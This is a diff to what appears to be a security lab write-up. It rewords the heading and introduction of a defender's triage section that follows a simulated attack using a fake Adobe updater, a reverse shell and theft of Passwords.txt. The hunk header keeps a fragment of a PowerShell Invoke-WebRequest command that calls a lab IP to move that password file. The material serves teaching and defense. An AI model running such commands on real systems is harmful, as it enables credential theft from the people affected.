@@ -196,11 +196,11 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 <img src="analysis/screenshots_v1/Figure_13.png" alt="Wireshark: TCP stream" width="65%"><br>
 
 ---
-## 🛡️ Defender’s Perspective: Detecting the Attack in Action
+## 🛡️ Defender’s Perspective: Triaging a Compromised Windows Host
 
-Now that we’ve followed the attacker’s full playbook — from clicking the fake Adobe updater to catching a reverse shell and exfiltrating `Passwords.txt` — let’s switch gears and step into the defender’s shoes.
+Now that we’ve followed the attack from the attackers POV  — from clicking the fake Adobe updater to catching a reverse shell and exfiltrating `Passwords.txt` — let’s switch gears and step into the defender’s shoes.
 
-This next section walks through how security analysts can spot and respond to this kind of behavior using network traffic analysis tools like Wireshark, autorun entries, and Process Explorer.
+This next section walks through how security analysts can spot and respond to this kind of behavior using network traffic analysis tools like Wireshark, Autorun entries, and Process Explorer.
 
 ---
 
